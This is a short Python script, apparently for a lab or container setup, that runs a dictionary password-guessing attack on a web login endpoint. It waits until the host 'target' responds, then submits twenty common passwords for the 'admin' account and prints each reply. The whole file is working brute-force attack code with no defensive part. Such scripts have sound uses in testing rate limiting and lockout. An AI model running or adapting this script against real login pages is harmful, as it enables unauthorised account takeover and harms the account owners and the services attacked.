import requests
import time

TARGET_URL = "http://target:5000/login"

passwords_to_try = [
    "123456", "password", "admin123", "letmein", "qwerty",
    "welcome", "admin1", "password1", "12345678", "iloveyou",
    "abc123", "monkey", "football", "dragon", "master",
    "sunshine", "password123", "trustno1", "hello", "freedom"
]

username = "admin"

# Wait for target to be ready before attacking
print("Waiting for target to be ready...")
for attempt in range(10):
    try:
        requests.post(TARGET_URL, data={"username": "test", "password": "test"}, timeout=2)
        print("Target is ready. Starting attack.")
        break
    except requests.exceptions.ConnectionError:
        print("Target not ready yet, retrying in 2s...")
        time.sleep(2)

for pwd in passwords_to_try:
    try:
        response = requests.post(TARGET_URL, data={"username": username, "password": pwd})
        print(f"Tried password '{pwd}' -> {response.text}")
    except requests.exceptions.ConnectionError:
        print(f"Could not reach target for password '{pwd}'")
    time.sleep(0.5)